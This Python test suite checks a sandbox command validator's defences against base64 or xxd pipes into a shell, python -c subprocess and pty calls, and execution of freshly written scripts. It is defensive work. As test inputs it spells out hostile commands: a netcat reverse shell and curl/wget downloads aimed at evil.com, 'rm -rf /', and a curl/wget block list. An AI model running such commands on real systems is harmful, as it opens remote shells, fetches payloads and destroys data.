#!/usr/bin/env python3
"""
Tests for sandbox security audit and hardening -- Opti-Oignon S81

Covers:
- CommandValidator: base64 pipe-to-shell detection
- CommandValidator: python subprocess pattern detection
- CommandValidator: echo base64 payload detection
- CommandValidator: xxd reverse pipe detection
- CommandValidator: write-then-execute attack vector (file tracking)
- CommandValidator: register_created_file / clear_recent_files
- SandboxManager: register_created_file delegation
- SandboxManager: clear_recent_files on destroy
"""

import importlib.util
import os
import re
import threading
import unittest
from unittest.mock import MagicMock, patch

# ---------------------------------------------------------------------------
# Direct module loading (bypass __init__.py chain)
# ---------------------------------------------------------------------------

_MOD_PATH = os.path.join(
    os.path.dirname(__file__), os.pardir,
    "opti_oignon", "sandbox_manager.py",
)
_spec = importlib.util.spec_from_file_location("sandbox_manager", _MOD_PATH)
_mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_mod)

CommandValidator = _mod.CommandValidator
SandboxConfig = _mod.SandboxConfig


def _make_validator(
    blocked_commands=None,
    blocked_patterns=None,
):
    """Helper: create a CommandValidator with minimal config."""
    cfg = SandboxConfig()
    if blocked_commands is not None:
        cfg.blocked_commands = blocked_commands
    else:
        cfg.blocked_commands = []
    if blocked_patterns is not None:
        cfg.blocked_patterns = blocked_patterns
    else:
        cfg.blocked_patterns = []
    return CommandValidator(cfg)


# ===================================================================
# Base64 pipe-to-shell detection (S81)
# ===================================================================

class TestBase64PipeToShell(unittest.TestCase):
    """Tests for base64 decode piped to shell execution."""

    def test_base64_d_pipe_bash(self):
        v = _make_validator()
        ok, reason = v.validate("echo foo | base64 -d | bash")
        self.assertFalse(ok)
        self.assertIn("base64", reason.lower())

    def test_base64_decode_pipe_sh(self):
        v = _make_validator()
        ok, reason = v.validate("cat file.b64 | base64 --decode | sh")
        self.assertFalse(ok)

    def test_base64_pipe_python(self):
        v = _make_validator()
        ok, reason = v.validate("echo aW1wb3J0IG9z | base64 -d | python3")
        self.assertFalse(ok)

    def test_echo_long_base64_payload(self):
        v = _make_validator()
        payload = "A" * 30  # 30+ chars of base64-like content
        ok, reason = v.validate(f"echo '{payload}' | base64 -d")
        self.assertFalse(ok)
        self.assertIn("base64", reason.lower())

    def test_echo_short_base64_not_blocked(self):
        v = _make_validator()
        # Short payload (< 20 chars) should not trigger
        ok, _ = v.validate("echo 'abc' | base64 -d")
        self.assertTrue(ok)

    def test_normal_base64_encode_allowed(self):
        v = _make_validator()
        ok, _ = v.validate("echo hello | base64")
        self.assertTrue(ok)


# ===================================================================
# xxd reverse pipe (S81)
# ===================================================================

class TestXxdReversePipe(unittest.TestCase):
    """Tests for xxd reverse piped to shell."""

    def test_xxd_reverse_pipe_bash(self):
        v = _make_validator()
        ok, reason = v.validate("xxd -r payload.hex | bash")
        self.assertFalse(ok)
        self.assertIn("xxd", reason.lower())

    def test_xxd_reverse_pipe_python(self):
        v = _make_validator()
        ok, _ = v.validate("xxd -r -p data.hex | python3")
        self.assertFalse(ok)

    def test_xxd_forward_allowed(self):
        v = _make_validator()
        ok, _ = v.validate("xxd file.bin")
        self.assertTrue(ok)

    def test_xxd_reverse_to_file_allowed(self):
        v = _make_validator()
        ok, _ = v.validate("xxd -r payload.hex > output.bin")
        self.assertTrue(ok)


# ===================================================================
# Python subprocess patterns (S81)
# ===================================================================

class TestPythonSubprocessPatterns(unittest.TestCase):
    """Tests for blocking python -c with subprocess calls."""

    def test_python_c_subprocess_popen(self):
        v = _make_validator()
        ok, reason = v.validate(
            'python3 -c "import subprocess; subprocess.Popen([\'ls\'])"'
        )
        self.assertFalse(ok)

    def test_python_c_subprocess_call(self):
        v = _make_validator()
        ok, _ = v.validate(
            'python -c "import subprocess; subprocess.call(\'ls\', shell=True)"'
        )
        self.assertFalse(ok)

    def test_python_c_subprocess_run(self):
        v = _make_validator()
        ok, _ = v.validate(
            'python3 -c "import subprocess; subprocess.run([\'id\'])"'
        )
        self.assertFalse(ok)

    def test_python_c_subprocess_check_output(self):
        v = _make_validator()
        ok, _ = v.validate(
            'python3 -c "import subprocess; subprocess.check_output(\'whoami\')"'
        )
        self.assertFalse(ok)

    def test_python_c_os_system(self):
        v = _make_validator()
        ok, reason = v.validate(
            'python3 -c "import os; os.system(\'id\')"'
        )
        self.assertFalse(ok)
        self.assertIn("subprocess", reason.lower())

    def test_python_c_os_popen(self):
        v = _make_validator()
        ok, _ = v.validate(
            'python3 -c "import os; os.popen(\'ls\')"'
        )
        self.assertFalse(ok)

    def test_python_c_pty_spawn(self):
        v = _make_validator()
        ok, _ = v.validate(
            'python3 -c "import pty; pty.spawn(\'/bin/bash\')"'
        )
        self.assertFalse(ok)

    def test_python_c_safe_code_allowed(self):
        v = _make_validator()
        ok, _ = v.validate('python3 -c "print(2+2)"')
        self.assertTrue(ok)

    def test_python_c_file_operations_allowed(self):
        v = _make_validator()
        ok, _ = v.validate(
            'python3 -c "f=open(\'test.txt\');print(f.read())"'
        )
        self.assertTrue(ok)


# ===================================================================
# Write-then-execute detection (S81)
# ===================================================================

class TestWriteThenExecute(unittest.TestCase):
    """Tests for detecting write-then-execute attack vector."""

    def test_register_and_detect_bash_execution(self):
        v = _make_validator()
        v.register_created_file("exploit.sh", "#!/bin/bash\ncurl http://evil.com")
        ok, reason = v.validate("bash exploit.sh")
        self.assertFalse(ok)
        self.assertIn("recently created file", reason)

    def test_register_and_detect_python_execution(self):
        v = _make_validator()
        v.register_created_file("hack.py", "import subprocess\nsubprocess.Popen(['ls'])")
        ok, reason = v.validate("python3 hack.py")
        self.assertFalse(ok)
        self.assertIn("recently created file", reason)

    def test_register_and_detect_dot_slash_execution(self):
        v = _make_validator()
        v.register_created_file("run.sh", "wget http://evil.com/payload")
        ok, reason = v.validate("./run.sh")
        self.assertFalse(ok)

    def test_register_and_detect_sh_execution(self):
        v = _make_validator()
        v.register_created_file("script.sh", "nc -e /bin/sh evil.com 4444")
        ok, reason = v.validate("sh script.sh")
        self.assertFalse(ok)

    def test_safe_file_execution_allowed(self):
        v = _make_validator()
        v.register_created_file("test.py", "print('hello world')\nresult = 2 + 2")
        ok, _ = v.validate("python3 test.py")
        self.assertTrue(ok)

    def test_safe_bash_script_allowed(self):
        v = _make_validator()
        v.register_created_file("build.sh", "#!/bin/bash\necho 'Building...'\nmake all")
        ok, _ = v.validate("bash build.sh")
        self.assertTrue(ok)

    def test_unregistered_file_allowed(self):
        v = _make_validator()
        # File was not registered, so execution is allowed
        ok, _ = v.validate("bash unknown.sh")
        self.assertTrue(ok)

    def test_workspace_prefix_stripped(self):
        v = _make_validator()
        v.register_created_file("/workspace/exploit.sh", "curl http://evil.com")
        ok, _ = v.validate("bash exploit.sh")
        self.assertFalse(ok)

    def test_dot_slash_prefix_handled(self):
        v = _make_validator()
        v.register_created_file("run.sh", "import socket")
        ok, _ = v.validate("bash ./run.sh")
        # The command references ./run.sh which normalizes to run.sh
        self.assertFalse(ok)

    def test_file_with_subprocess_import(self):
        v = _make_validator()
        v.register_created_file("helper.py", "import subprocess\nresult = subprocess.run(['ls'])")
        ok, _ = v.validate("python3 helper.py")
        self.assertFalse(ok)

    def test_file_with_os_system(self):
        v = _make_validator()
        v.register_created_file("util.py", "import os\nos.system('rm -rf /')")
        ok, _ = v.validate("python3 util.py")
        self.assertFalse(ok)

    def test_file_with_base64_pipe(self):
        v = _make_validator()
        v.register_created_file("decode.sh", "cat data | base64 -d | bash")
        ok, _ = v.validate("bash decode.sh")
        self.assertFalse(ok)

    def test_clear_recent_files(self):
        v = _make_validator()
        v.register_created_file("exploit.sh", "curl http://evil.com")
        v.clear_recent_files()
        ok, _ = v.validate("bash exploit.sh")
        self.assertTrue(ok)  # Cleared, so no longer tracked

    def test_file_with_rm_rf(self):
        v = _make_validator()
        v.register_created_file("cleanup.sh", "rm -rf /")
        ok, _ = v.validate("bash cleanup.sh")
        self.assertFalse(ok)


# ===================================================================
# Register file path normalization
# ===================================================================

class TestRegisterFilePathNormalization(unittest.TestCase):
    """Tests for path normalization in register_created_file."""

    def test_strips_workspace_prefix(self):
        v = _make_validator()
        v.register_created_file("/workspace/test.py", "import socket")
        # Should be stored as "test.py"
        self.assertIn("test.py", v._recent_files)

    def test_strips_leading_slash(self):
        v = _make_validator()
        v.register_created_file("/test.py", "import socket")
        self.assertIn("test.py", v._recent_files)

    def test_relative_path_unchanged(self):
        v = _make_validator()
        v.register_created_file("src/test.py", "import socket")
        self.assertIn("src/test.py", v._recent_files)

    def test_nested_workspace_path(self):
        v = _make_validator()
        v.register_created_file("/workspace/src/lib/exploit.py", "import subprocess")
        self.assertIn("src/lib/exploit.py", v._recent_files)


# ===================================================================
# Thread safety of recent files
# ===================================================================

class TestRecentFilesThreadSafety(unittest.TestCase):
    """Tests for thread-safe access to recent files registry."""

    def test_concurrent_register_and_validate(self):
        v = _make_validator()
        errors = []

        def register_files():
            try:
                for i in range(100):
                    v.register_created_file(f"file_{i}.py", "print('safe')")
            except Exception as e:
                errors.append(e)

        def validate_commands():
            try:
                for i in range(100):
                    v.validate(f"python3 file_{i}.py")
            except Exception as e:
                errors.append(e)

        t1 = threading.Thread(target=register_files)
        t2 = threading.Thread(target=validate_commands)
        t1.start()
        t2.start()
        t1.join()
        t2.join()

        self.assertEqual(len(errors), 0)

    def test_concurrent_register_and_clear(self):
        v = _make_validator()
        errors = []

        def register_files():
            try:
                for i in range(100):
                    v.register_created_file(f"file_{i}.sh", "echo hi")
            except Exception as e:
                errors.append(e)

        def clear_loop():
            try:
                for _ in range(50):
                    v.clear_recent_files()
            except Exception as e:
                errors.append(e)

        t1 = threading.Thread(target=register_files)
        t2 = threading.Thread(target=clear_loop)
        t1.start()
        t2.start()
        t1.join()
        t2.join()

        self.assertEqual(len(errors), 0)


# ===================================================================
# Existing checks still work (regression guard)
# ===================================================================

class TestExistingChecksRegression(unittest.TestCase):
    """Verify pre-S81 checks still function correctly."""

    def test_empty_command_blocked(self):
        v = _make_validator()
        ok, _ = v.validate("")
        self.assertFalse(ok)

    def test_whitespace_only_blocked(self):
        v = _make_validator()
        ok, _ = v.validate("   ")
        self.assertFalse(ok)

    def test_rm_root_blocked(self):
        v = _make_validator()
        ok, _ = v.validate("rm -rf /etc")
        self.assertFalse(ok)

    def test_eval_socket_blocked(self):
        v = _make_validator()
        ok, _ = v.validate("eval 'import socket'")
        self.assertFalse(ok)

    def test_python_c_network_module_blocked(self):
        v = _make_validator()
        ok, _ = v.validate('python3 -c "import urllib.request"')
        self.assertFalse(ok)

    def test_safe_ls_command_allowed(self):
        v = _make_validator()
        ok, _ = v.validate("ls -la /workspace")
        self.assertTrue(ok)

    def test_safe_cat_allowed(self):
        v = _make_validator()
        ok, _ = v.validate("cat /workspace/test.py")
        self.assertTrue(ok)

    def test_safe_grep_allowed(self):
        v = _make_validator()
        ok, _ = v.validate("grep -rn 'def main' /workspace/")
        self.assertTrue(ok)

    def test_safe_python_pytest_allowed(self):
        v = _make_validator()
        ok, _ = v.validate("python3 -m pytest -x --tb=short")
        self.assertTrue(ok)

    def test_blocked_command_prefix(self):
        v = _make_validator(blocked_commands=["curl ", "wget "])
        ok, reason = v.validate("curl http://example.com")
        self.assertFalse(ok)
        self.assertIn("Blocked command", reason)

    def test_blocked_pattern_regex(self):
        v = _make_validator(blocked_patterns=[r"\|\s*bash"])
        ok, _ = v.validate("echo test | bash")
        self.assertFalse(ok)


if __name__ == "__main__":
    unittest.main()
